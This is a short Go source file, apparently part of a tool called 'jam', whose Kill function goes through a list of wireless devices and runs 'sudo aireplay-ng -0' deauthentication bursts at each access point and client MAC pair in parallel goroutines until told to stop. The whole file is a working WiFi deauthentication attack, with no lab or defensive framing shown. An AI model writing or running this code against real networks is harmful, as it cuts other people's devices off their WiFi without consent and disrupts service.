package kill

import (
    "github.com/mstripling/jam/internal/async"
    "github.com/mstripling/jam/internal/cook"
    "fmt"
    "sync"
)

func Kill(s []cook.DeviceEntry, power int, wifiCardName string, stopChan <-chan struct{}, wg *sync.WaitGroup) {
    defer wg.Done()

    for _, device := range s{
        go func(device cook.DeviceEntry) {
            select{
            case <-stopChan:
                return
            default:
            cmd := fmt.Sprintf("sudo aireplay-ng -0 %d -a %s -c %s %s", power, device.BSSID, device.MAC, wifiCardName)
            async.SimpleDelay(cmd, 30)
            }
        }(device)
    }
}
